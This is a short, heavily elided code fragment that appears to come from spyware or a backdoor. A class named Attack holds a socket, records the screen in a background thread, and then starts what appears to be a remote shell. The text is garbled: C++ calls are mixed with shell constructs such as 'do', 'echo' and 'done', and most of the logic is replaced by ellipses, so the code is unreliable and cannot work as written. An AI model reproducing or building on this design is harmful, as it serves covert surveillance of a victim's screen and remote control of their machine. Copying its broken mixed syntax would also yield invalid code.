...
int sock;
std::atomic<bool> recording(true); // Shared flag to control recording
...
public:
    ...
    void RecordScreen()
    do
        echo "[+] Recording screen... Press ESC to stop.\n";
        ...
        if (hr != 0) { AVIFileRelease(pfile); return; }
        ...
        if (hr != 0) { AVIStreamRelease(pstream); AVIFileRelease(pfile); return; }
        ...
        do
            ...
            do
                echo "[!] ESC pressed. Stopping recording.\n";
                recording = false;
                break;
            done
...
do
    ...
    std::thread recorder(&Attack::RecordScreen, &a); // Start recording in parallel
    a.Shell(); // Start shell

    recorder.join(); // Wait for recording to finish
